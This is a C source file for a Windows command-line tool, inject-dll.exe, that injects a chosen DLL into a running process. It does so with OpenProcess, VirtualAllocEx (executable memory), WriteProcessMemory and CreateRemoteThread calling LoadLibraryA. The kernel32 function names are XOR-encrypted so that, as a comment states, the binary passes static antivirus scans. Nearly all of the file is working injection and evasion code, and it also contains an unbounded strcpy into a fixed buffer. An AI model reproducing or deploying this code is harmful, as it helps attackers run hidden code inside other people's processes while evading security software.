/**
 * \file main.c
 * \brief DLL injection program.
 * \author Jérémy ZYRA
 * \version 1.0
 * \date 08-01-2023
 *
 * Program for injecting a DLL into a running process.
 *
 */
#include <stdio.h>
#include <windows.h>

#define KEY 0xaa

typedef HANDLE (*t_op)  (DWORD, BOOL, DWORD);
typedef LPVOID (*t_vae) (HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (*t_wpm) (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
typedef HANDLE (*t_crt) (HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL   (*t_ch)  (HANDLE);

/**
 * \fn void print_help()
 * \brief Function to print the command help.
 */
void print_help() {
  printf("NAME\n");
  printf("\tinject-dll.exe\n\n");
  printf("SYNOPSIS\n");
  printf("\tinject-dll.exe DLL_PATH PID\n\n");
  printf("DESCRIPTION\n");
  printf("\tInject a dll into a running process.\n\n");
  printf("OPTIONS\n");
  printf("\tDLL_PATH\n");
  printf("\tPath to the dll file to inject.\n\n");
  printf("\tPID\n");
  printf("\tPID of the target process.\n\n");
  printf("AUTHOR\n");
  printf("\tJeremy ZYRA\n");
  exit(0);
}

/**
 * \fn void get_args(const int argc, const char *argv[], char *path, DWORD *pid)
 * \brief Function used to retrieve program arguments.
 *
 * \param[in] argc Number of parameters (passed by the main function).
 * \param[in] argv Parameters (passed by the main function).
 * \param[out] path The path to the dll to inject (param).
 * \param[out] pid The PID of the target process.
 */
void get_args(const int argc, const char *argv[], char *path, DWORD *pid) {
  if (argc > 2) {
    strcpy(path, argv[1]);
    *pid = atoi(argv[2]);
    FILE *f = fopen(path, "r");
    if (pid == 0) {
      print_help();
    }
    if (f == NULL) {
      print_help();
    } else {
      fclose(f);
    }
  } else {
    print_help();
  }
}

/**
 * \fn xor_string(const char *name, const int len, const unsigned char key, char* res)
 * \brief Function used to decrypt a character string encrypted by an xor.
 *
 * \param[in] name The target character string.
 * \param[in] len The size of the "name" parameter.
 * \param[in] key The key to apply a xor.
 * \param[out] res The string resulting from the operation.
 */
void xor_string(const char *name, const int len, const unsigned char key, char* res) {
  for (int i = 0; i < len; ++i) {
    res[i] = (char) (name[i] ^ key);
  }
  res[len - 1] = 0x00;
}

/**
 * \fn void error(const char *funcName)
 * \brief Function used to display an error.
 *
 * \param[in] funcName The function responsible for the error.
 */
void error(const char *funcName) {
  printf("Error function call : %s\n", funcName);
  exit(1);
}

/**
 * \fn void inject_dll(const char *path, const DWORD pid)
 * \brief Function used to inject the DLL.
 *
 * \param[in] path The path of the DLL to inject.
 * \param[in] pid PID of the target process.
 */
void inject_dll(const char *path, const DWORD pid) {

  HANDLE hp;
  PVOID rb;
  PTHREAD_START_ROUTINE lb;
  int sizePath = strlen(path);

  /* Name of Windows functions and Kernel32 dll encrypted by an XOR.
  This step is required to pass the static antivirus scan. */
  char kernel32_xor_name[] = {0xe1, 0xcf, 0xd8, 0xc4, 0xcf, 0xc6, 0x99, 0x98, 0x00};
  char openprocess_xor_name[] = {0xe5, 0xda, 0xcf, 0xc4, 0xfa, 0xd8, 0xc5, 0xc9, 0xcf, 0xd9, 0xd9, 0x00};
  char virtualallocex_xor_name[] = {0xfc, 0xc3, 0xd8, 0xde, 0xdf, 0xcb, 0xc6, 0xeb, 0xc6, 0xc6, 0xc5, 0xc9, 0xef, 0xd2, 0x00};
  char writeprocessmemory_xor_name[] = {0xfd, 0xd8, 0xc3, 0xde, 0xcf, 0xfa, 0xd8, 0xc5, 0xc9, 0xcf, 0xd9, 0xd9, 0xe7, 0xcf, 0xc7, 0xc5, 0xd8, 0xd3, 0x00};
  char createremotethread_xor_name[] = {0xe9, 0xd8, 0xcf, 0xcb, 0xde, 0xcf, 0xf8, 0xcf, 0xc7, 0xc5, 0xde, 0xcf, 0xfe, 0xc2, 0xd8, 0xcf, 0xcb, 0xce, 0x00};
  char loadlibrarya_xor_name[] = {0xe6, 0xc5, 0xcb, 0xce, 0xe6, 0xc3, 0xc8, 0xd8, 0xcb, 0xd8, 0xd3, 0xeb, 0x00};
  char closehandle_xor_name[] = {0xe9, 0xc6, 0xc5, 0xd9, 0xcf, 0xe2, 0xcb, 0xc4, 0xce, 0xc6, 0xcf, 0x00};

  // Allocations of the variables which will contain the deciphered names.
  char *kernel32_name = (char *) malloc(sizeof(kernel32_xor_name));
  char *openprocess_name = (char *) malloc(sizeof(openprocess_xor_name));
  char *virtualallocex_name = (char *) malloc(sizeof(virtualallocex_xor_name));
  char *writeprocessmemory_name = (char *) malloc(sizeof(writeprocessmemory_xor_name));
  char *createremotethread_name = (char *) malloc(sizeof(createremotethread_xor_name));
  char *loadlibrarya_name = (char *) malloc(sizeof(loadlibrarya_xor_name));
  char *closehandle_name = (char *) malloc(sizeof(closehandle_xor_name));

  // Decrypt names.
  xor_string(kernel32_xor_name, sizeof(kernel32_xor_name), KEY, kernel32_name);
  xor_string(openprocess_xor_name, sizeof(openprocess_xor_name), KEY, openprocess_name);
  xor_string(virtualallocex_xor_name, sizeof(virtualallocex_xor_name), KEY, virtualallocex_name);
  xor_string(writeprocessmemory_xor_name, sizeof(writeprocessmemory_xor_name), KEY, writeprocessmemory_name);
  xor_string(createremotethread_xor_name, sizeof(createremotethread_xor_name), KEY, createremotethread_name);
  xor_string(loadlibrarya_xor_name, sizeof(loadlibrarya_xor_name), KEY, loadlibrarya_name);
  xor_string(closehandle_xor_name, sizeof(closehandle_xor_name), KEY, closehandle_name);

  // Retrieve pointers to functions whose names have been decrypted.
  t_op op = (t_op) GetProcAddress(GetModuleHandle(TEXT(kernel32_name)), openprocess_name);
  t_vae vae = (t_vae) GetProcAddress(GetModuleHandle(TEXT(kernel32_name)), virtualallocex_name);
  t_wpm wpm = (t_wpm) GetProcAddress(GetModuleHandle(TEXT(kernel32_name)), writeprocessmemory_name);
  t_crt crt = (t_crt) GetProcAddress(GetModuleHandle(TEXT(kernel32_name)), createremotethread_name);
  t_ch ch = (t_ch) GetProcAddress(GetModuleHandle(TEXT(kernel32_name)), closehandle_name);

  //Inject the DLL.
  /*
    Equivalent to the following line of code:
    lb = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");
  */
  lb = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle(TEXT(kernel32_name)), loadlibrarya_name);

  /*
    Equivalent to the following line of code:
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  */
  hp = op(PROCESS_ALL_ACCESS, FALSE, pid);
  if (!hp || hp == INVALID_HANDLE_VALUE) {
    error(openprocess_name);
  }

  /*
    Equivalent to the following line of code:
    rb = VirtualAllocEx(hp, NULL, sizePath, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  */
  rb = vae(hp, NULL, sizePath, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (rb == NULL) {
    error(virtualallocex_name);
  }

  /*
    Equivalent to the following line of code:
    WINBOOL ret = WriteProcessMemory(hp, rb, path, sizePath, 0);
  */
  WINBOOL ret = wpm(hp, rb, path, sizePath, 0);
  if (ret == 0) {
    error(writeprocessmemory_name);
  }

  /*
    Equivalent to the following line of code:
    HANDLE hret = CreateRemoteThread(hp, NULL, 0, lb, rb, 0, 0);
  */
  HANDLE hret = crt(hp, NULL, 0, lb, rb, 0, 0);
  if (!hret) {
    error(createremotethread_name);
  }

  /*
    Equivalent to the following line of code:
    CloseHandle(hp);
  */
  ch(hp);

  // Free buffers containing decrypted names.
  free(kernel32_name);
  free(openprocess_name);
  free(virtualallocex_name);
  free(writeprocessmemory_name);
  free(createremotethread_name);
  free(loadlibrarya_name);
  free(closehandle_name);
}

/**
 * \fn int main(const int argc, const char *argv[])
 * \brief Program entry point.
 *
 * \param[in] argc Number of parameters.
 * \param[in] argv Parameters.
 * \return Error code or 0 if there is no error.
 */
int main(const int argc, const char *argv[])
{
  DWORD pid = 0;
  char path[MAX_PATH];
  get_args(argc, argv, path, &pid);
  inject_dll(path, pid);
  return 0;
}
